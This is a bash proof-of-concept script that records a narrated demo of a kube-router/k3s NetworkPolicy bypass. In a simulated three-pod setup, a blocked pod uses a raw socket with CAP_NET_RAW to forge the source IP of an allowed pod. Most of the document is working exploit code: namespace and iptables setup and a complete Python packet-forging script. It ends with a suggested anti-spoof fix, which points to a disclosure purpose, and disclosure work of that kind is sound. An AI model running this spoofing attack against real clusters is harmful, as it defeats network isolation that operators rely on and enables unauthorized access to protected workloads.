#!/bin/bash
# kube-router / k3s NetworkPolicy Bypass — Narrated Step-by-Step Demo
#
# Simulates an attacker manually working through the exploit:
#   1. Confirm we are in a default (unprivileged) pod
#   2. Build 3-pod topology (network namespaces + bridge)
#   3. Configure kube-router iptables chain hierarchy
#   4. Baseline: verify policy works for normal sockets
#   5. Attack: bypass with a spoofed raw socket
#   6. Results: iptables counters prove the bypass
#
# Record with:
#   asciinema rec --overwrite --cols 120 --rows 40 poc/kube_router_bypass.cast \
#                 -c "bash poc/kube_router_demo.sh"

# ─── Silent pre-setup (not shown in recording) ────────────────────────────────
PATH="$PATH:/sbin:/usr/sbin"

A="10.244.0.10"   # allowed-source pod
B="10.244.0.20"   # blocked-source / attacker pod
T="10.244.0.30"   # target pod
BR="10.244.0.1"
PORT=9882

# Cleanup any previous run silently
{
    pkill -f "python3.*$PORT" 2>/dev/null || true
    for ns in ns_allowed ns_blocked ns_target; do
        ip netns del "$ns" 2>/dev/null || true
    done
    ip link set br0 down 2>/dev/null
    ip link del br0 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
    for c in KUBE-ROUTER-FORWARD KUBE-POD-FW-target KUBE-NWPLCY-target; do
        iptables -F "$c" 2>/dev/null || true
        iptables -X "$c" 2>/dev/null || true
    done
    rm -f /tmp/demo_recv /tmp/listener.py /tmp/send_legit.py \
          /tmp/send_blocked.py /tmp/attack.py /tmp/mk_pod.sh
} 2>/dev/null

trap '{
    pkill -f "python3.*'"$PORT"'" 2>/dev/null || true
    for ns in ns_allowed ns_blocked ns_target; do
        ip netns del "$ns" 2>/dev/null || true
    done
    ip link set br0 down 2>/dev/null
    ip link del br0 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
    for c in KUBE-ROUTER-FORWARD KUBE-POD-FW-target KUBE-NWPLCY-target; do
        iptables -F "$c" 2>/dev/null || true
        iptables -X "$c" 2>/dev/null || true
    done
    rm -f /tmp/demo_recv /tmp/listener.py /tmp/send_legit.py \
          /tmp/send_blocked.py /tmp/attack.py /tmp/mk_pod.sh
}' EXIT

# Pre-write helper scripts (shown via `cat` during demo)
cat > /tmp/mk_pod.sh << SHEOF
#!/bin/bash
# Usage: mk_pod.sh <netns> <veth-host> <veth-pod> <ip> <bridge-gw>
NS=\$1; VH=\$2; VP=\$3; IP=\$4; GW=\$5
ip netns add \$NS
ip link add \$VH type veth peer name \$VP
ip link set \$VP netns \$NS
ip link set \$VH master br0
ip link set \$VH up
ip netns exec \$NS ip link set lo up
ip netns exec \$NS ip link set \$VP up
ip netns exec \$NS ip addr add \$IP/24 dev \$VP
ip netns exec \$NS ip route add default via \$GW
echo "  pod \$NS  ip=\$IP  veth=\$VH<->\$VP"
SHEOF
chmod +x /tmp/mk_pod.sh

cat > /tmp/listener.py << PYEOF
import socket, sys
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', $PORT))
s.settimeout(180)
open('/tmp/demo_recv', 'w').write('')
print(f'[target] listening on UDP :$PORT', flush=True)
while True:
    try:
        data, addr = s.recvfrom(1024)
        msg = f'  src={addr[0]}  payload={data.decode()}'
        print(msg, flush=True)
        open('/tmp/demo_recv', 'a').write(msg + '\n')
    except socket.timeout:
        break
PYEOF

cat > /tmp/send_legit.py << PYEOF
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'LEGITIMATE-TRAFFIC', ('$T', $PORT))
print('sent LEGITIMATE-TRAFFIC  src=$A (real)')
PYEOF

cat > /tmp/send_blocked.py << PYEOF
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'REAL-BLOCKED-TRAFFIC', ('$T', $PORT))
print('sent REAL-BLOCKED-TRAFFIC  src=$B (real)')
PYEOF

cat > /tmp/attack.py << PYEOF
import socket, struct

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

SRC  = '$A'   # SPOOFED — matches NetworkPolicy allow-list
DST  = '$T'   # target pod
PORT = $PORT
PAY  = b'BYPASSED-KUBE-ROUTER'

# Build raw IP header (protocol=17 UDP)
ip_hdr = struct.pack('!BBHHHBBH4s4s',
    0x45, 0, 28 + len(PAY),          # ver/ihl, tos, total-len
    1234, 0, 64, 17, 0,              # id, frag, ttl, proto, checksum=0
    socket.inet_aton(SRC),
    socket.inet_aton(DST))
ip_hdr = ip_hdr[:10] + struct.pack('!H', checksum(ip_hdr)) + ip_hdr[12:]

# Build UDP header
udp_hdr = struct.pack('!HHHH', 54321, PORT, 8 + len(PAY), 0) + PAY
pseudo  = struct.pack('!4s4sBBH',
    socket.inet_aton(SRC), socket.inet_aton(DST), 0, 17, len(udp_hdr))
udp_hdr = udp_hdr[:6] + struct.pack('!H', checksum(pseudo + udp_hdr)) + udp_hdr[8:]

# Send — requires only CAP_NET_RAW (default Kubernetes pod capability)
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
n = s.sendto(ip_hdr + udp_hdr, (DST, 0))
s.close()

print(f'')
print(f'  bytes sent : {n}')
print(f'  source IP  : {SRC}  <-- SPOOFED (real pod IP is $B)')
print(f'  dest IP    : {DST}:{PORT}')
print(f'  payload    : {PAY.decode()}')
PYEOF

# ─── Colors ───────────────────────────────────────────────────────────────────
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'
CYAN='\033[1;36m'; BLUE='\033[1;34m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

# ─── Helpers ──────────────────────────────────────────────────────────────────

# Simulate human typing — random 40-90ms per character
type_cmd() {
    local text="$1"
    printf "\033[1;32mroot@pod-attacker\033[0m:\033[1;34m~\033[0m\033[1m#\033[0m "
    for (( i=0; i<${#text}; i++ )); do
        printf '%s' "${text:$i:1}"
        sleep "0.0$(( RANDOM % 5 + 4 ))"
    done
    sleep 0.7
    printf '\n'
}

# Type and run a command
run() {
    type_cmd "$*"
    eval "$*" 2>&1
    sleep 1.3
}

# Narrative comment (grey, indented)
note() {
    printf "\n${DIM}  # %s${NC}\n\n" "$*"
    sleep 2.2
}

# Section header
section() {
    printf "\n\n"
    printf "${BOLD}${CYAN}┌──────────────────────────────────────────────────────────────────────┐${NC}\n"
    printf "${BOLD}${CYAN}│  %-70s│${NC}\n" "$*"
    printf "${BOLD}${CYAN}└──────────────────────────────────────────────────────────────────────┘${NC}\n\n"
    sleep 2
}

ok()  { printf "${GREEN}  ✓ %s${NC}\n" "$*"; }
bad() { printf "${RED}  ✗ %s${NC}\n" "$*"; }
pause() { sleep "${1:-2}"; }

# ═════════════════════════════════════════════════════════════════════════════
# BEGIN RECORDING
# ═════════════════════════════════════════════════════════════════════════════
clear
sleep 1

printf "${RED}${BOLD}"
cat << 'BANNER'

  ╔══════════════════════════════════════════════════════════════════════════╗
  ║                                                                          ║
  ║   kube-router / k3s  —  NetworkPolicy Bypass                            ║
  ║   CVE Candidate: CAP_NET_RAW Source IP Spoofing                         ║
  ║                                                                          ║
  ║   Capability required : CAP_NET_RAW  ← present in EVERY default pod    ║
  ║   Privileged pod      : NO                                               ║
  ║   Affected            : kube-router (all), k3s (all)                    ║
  ║                                                                          ║
  ║   A blocked pod can bypass NetworkPolicy and reach a denied target       ║
  ║   by spoofing the source IP of an allowed pod in a raw socket.          ║
  ║                                                                          ║
  ╚══════════════════════════════════════════════════════════════════════════╝

BANNER
printf "${NC}"
sleep 4

# ═════════════════════════════════════════════════════════════════════════════
# STEP 1 — Confirm we are in a default unprivileged pod
# ═════════════════════════════════════════════════════════════════════════════
section "STEP 1 — Confirm we are inside a default (unprivileged) pod"

note "Check who we are. No root on the host — just inside a container."
run "id"

note "Read our effective Linux capabilities from /proc"
run "grep CapEff /proc/self/status"

note "Decode the bitmask — we want to confirm CAP_NET_RAW (bit 13) is set"
run "capsh --decode=\$(grep CapEff /proc/self/status | awk '{print \$2}') | tr ',' '\n' | grep -E 'net_raw|net_admin|sys_admin'"

pause 1
printf "\n"
ok "cap_net_raw is present"
ok "cap_sys_admin is NOT present — this is a default pod, not privileged"
printf "\n"
pause 2

note "Prove it: open a raw socket right now using only default capabilities"
run "python3 -c \"
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
print('  AF_INET SOCK_RAW opened — IP_HDRINCL=1 — we control every byte of the packet')
s.close()
\""

pause 2

# ═════════════════════════════════════════════════════════════════════════════
# STEP 2 — Build 3-pod topology
# ═════════════════════════════════════════════════════════════════════════════
section "STEP 2 — Build 3-pod topology (network namespaces on a bridge)"

note "We simulate Kubernetes pod networking using Linux network namespaces"
printf "${DIM}"
cat << 'ARCH'

    ns_allowed  (10.244.0.10)  ─── vh_allowed ─┐
                                                 ├─ br0 (10.244.0.1)  ── FORWARD ── iptables
    ns_blocked  (10.244.0.20)  ─── vh_blocked ─┤        (host)
    (ATTACKER)                                   │
    ns_target   (10.244.0.30)  ─── vh_target  ─┘

ARCH
printf "${NC}"
pause 3

note "Create the bridge (simulates the pod overlay network)"
run "ip link add br0 type bridge"
run "ip addr add $BR/24 dev br0 && ip link set br0 up"
run "sysctl -w net.ipv4.ip_forward=1 -q && sysctl -w net.bridge.bridge-nf-call-iptables=1 -q"

note "Helper script: creates one pod (netns + veth pair attached to bridge)"
run "cat /tmp/mk_pod.sh"

pause 1
note "Create the three pods"
run "bash /tmp/mk_pod.sh ns_allowed  vh_allowed  vp_allowed  $A  $BR"
run "bash /tmp/mk_pod.sh ns_blocked  vh_blocked  vp_blocked  $B  $BR"
run "bash /tmp/mk_pod.sh ns_target   vh_target   vp_target   $T  $BR"

note "Confirm connectivity — ns_allowed can ping ns_target"
run "ip netns exec ns_allowed ping -c2 -W1 $T"

pause 2

# ═════════════════════════════════════════════════════════════════════════════
# STEP 3 — Configure kube-router NetworkPolicy (faithful replication)
# ═════════════════════════════════════════════════════════════════════════════
section "STEP 3 — Configure kube-router iptables chain hierarchy"

note "kube-router programs iptables with this exact structure:"
printf "${DIM}"
cat << 'CHAINS'

  FORWARD
    └─ KUBE-ROUTER-FORWARD       (-d <target> → jump to pod firewall)
         └─ KUBE-POD-FW-<hash>
              ├─ KUBE-NWPLCY-<hash>                    (evaluate policy)
              ├─ -m mark --mark 0x10000  -j ACCEPT      (policy matched → allow)
              └─ -j DROP                                 (default deny)

  KUBE-NWPLCY-<hash>:
    -m set --match-set KUBE-SRC-<hash> src  ← SOURCE IP ONLY — no interface check ⚠

CHAINS
printf "${NC}"
pause 4

note "Create the three kube-router chains"
run "iptables -N KUBE-ROUTER-FORWARD"
run "iptables -N KUBE-POD-FW-target"
run "iptables -N KUBE-NWPLCY-target"

note "Wire them into the kernel FORWARD hook"
run "iptables -I FORWARD -j KUBE-ROUTER-FORWARD"
run "iptables -A KUBE-ROUTER-FORWARD -d $T -j KUBE-POD-FW-target"

note "Inside KUBE-POD-FW: jump to policy, then ACCEPT if marked, else DROP"
run "iptables -A KUBE-POD-FW-target -j KUBE-NWPLCY-target"
run "iptables -A KUBE-POD-FW-target -m mark --mark 0x10000/0x10000 -j ACCEPT"
run "iptables -A KUBE-POD-FW-target -j DROP"

note "THE VULNERABLE RULE — matches source IP only. No -i <interface> qualifier."
note "Real kube-router: -m set --match-set KUBE-SRC-<hash> src  (same security property)"
run "iptables -A KUBE-NWPLCY-target -s $A -d $T -j MARK --set-xmark 0x10000/0x10000"

note "Inspect the full ruleset — notice: no interface check anywhere in any chain"
run "iptables -L FORWARD -n --line-numbers"
run "iptables -L KUBE-NWPLCY-target -n -v"

pause 2

# ═════════════════════════════════════════════════════════════════════════════
# STEP 4 — Baseline: verify the policy works for normal sockets
# ═════════════════════════════════════════════════════════════════════════════
section "STEP 4 — Baseline: verify NetworkPolicy works for normal traffic"

note "Start a UDP listener inside the target pod"
run "cat /tmp/listener.py"
pause 1
ip netns exec ns_target python3 /tmp/listener.py > /dev/null 2>&1 &
type_cmd "ip netns exec ns_target python3 /tmp/listener.py &"
sleep 0.8
ok "listener running in ns_target on UDP port $PORT"
printf "\n"
pause 1

note "Test 1: allowed-source ($A) sends to target — expect DELIVERED"
run "cat /tmp/send_legit.py"
run "ip netns exec ns_allowed python3 /tmp/send_legit.py"
sleep 0.6
printf "\n  ${BOLD}Target received:${NC}\n"
cat /tmp/demo_recv 2>/dev/null | sed 's/^/  /'
printf "\n"
ok "DELIVERED — NetworkPolicy correctly allowed $A"
> /tmp/demo_recv
pause 2

note "Test 2: blocked-source ($B) sends to target — expect BLOCKED"
run "cat /tmp/send_blocked.py"
run "ip netns exec ns_blocked python3 /tmp/send_blocked.py"
sleep 0.6
RECV=$(cat /tmp/demo_recv 2>/dev/null)
if [ -z "$RECV" ]; then
    printf "\n  ${BOLD}Target received:${NC} (nothing)\n\n"
    ok "BLOCKED — NetworkPolicy correctly denied $B"
else
    bad "unexpected delivery: $RECV"
fi
> /tmp/demo_recv
pause 2

printf "\n  ${GREEN}${BOLD}NetworkPolicy is working correctly for normal sockets.${NC}\n"
pause 3

# ═════════════════════════════════════════════════════════════════════════════
# STEP 5 — Attack: bypass with a spoofed raw socket
# ═════════════════════════════════════════════════════════════════════════════
section "STEP 5 — Attack: bypass NetworkPolicy from the BLOCKED pod"

note "The attack plan:"
printf "${DIM}"
cat << 'PLAN'

  1. From ns_blocked (real IP 10.244.0.20, DENIED by NetworkPolicy):
  2. Open AF_INET SOCK_RAW with IPPROTO_RAW  ← needs only CAP_NET_RAW (default)
  3. Set IP_HDRINCL=1 so we control the full IP header
  4. Craft a UDP packet with source IP = 10.244.0.10  (the ALLOWED pod)
  5. Send it to 10.244.0.30 (target)
  6. iptables sees src=10.244.0.10 → MARK → ACCEPT
  7. There is no interface check — the spoof is never detected

PLAN
printf "${NC}"
pause 4

note "Inspect the attack script (pure Python stdlib — no Scapy required)"
run "cat /tmp/attack.py"

pause 3
note "Execute the attack from ns_blocked (the DENIED pod)"
run "ip netns exec ns_blocked python3 /tmp/attack.py"

sleep 1
note "Check what the target pod actually received..."
printf "\n  ${BOLD}Target received:${NC}\n"
cat /tmp/demo_recv 2>/dev/null | sed 's/^/  /'
printf "\n"
pause 2

# ═════════════════════════════════════════════════════════════════════════════
# STEP 6 — Results: iptables counters confirm the bypass
# ═════════════════════════════════════════════════════════════════════════════
section "STEP 6 — iptables counters: forensic proof of the bypass"

note "KUBE-NWPLCY should show 2 MARK hits: 1 legitimate + 1 spoofed"
note "If the counter is 2, kube-router treated the spoofed packet as allowed."
run "iptables -L KUBE-NWPLCY-target -n -v"

pause 1
note "KUBE-POD-FW: 2 ACCEPT (both marked packets), 1 DROP (real blocked traffic)"
run "iptables -L KUBE-POD-FW-target -n -v"

pause 2

# ─── Final result box ─────────────────────────────────────────────────────────
printf "\n\n"
RECEIVED=$(cat /tmp/demo_recv 2>/dev/null | head -1 | sed 's/^ *//')
if echo "$RECEIVED" | grep -q "BYPASSED"; then
    printf "${RED}${BOLD}"
    cat << RESULT
  ╔══════════════════════════════════════════════════════════════════════════╗
  ║                                                                          ║
  ║   ★  NetworkPolicy BYPASSED  ★                                          ║
  ║                                                                          ║
  ║   Attacker pod  : 10.244.0.20  (DENIED by NetworkPolicy)                ║
  ║   Spoofed as    : 10.244.0.10  (the allowed pod)                        ║
  ║   Target recv'd : BYPASSED-KUBE-ROUTER                                  ║
  ║                                                                          ║
  ║   Capability    : CAP_NET_RAW  ← present in every default Kubernetes    ║
  ║                   pod — no privileged:true required                      ║
  ║                                                                          ║
  ║   Root cause    : KUBE-NWPLCY-* matches source IP only                  ║
  ║                   No -i <interface> check → spoofing undetected          ║
  ║                                                                          ║
  ║   Fix           : iptables -I KUBE-ROUTER-FORWARD 1 \                   ║
  ║                       -i <pod_veth> ! -s <pod_ip> -j DROP               ║
  ║                   (Like Calico's cali-from-ep-* anti-spoof chains)       ║
  ║                                                                          ║
  ╚══════════════════════════════════════════════════════════════════════════╝
RESULT
    printf "${NC}"
else
    printf "${YELLOW}Check /tmp/demo_recv — listener may have timed out${NC}\n"
    cat /tmp/demo_recv 2>/dev/null
fi

sleep 6
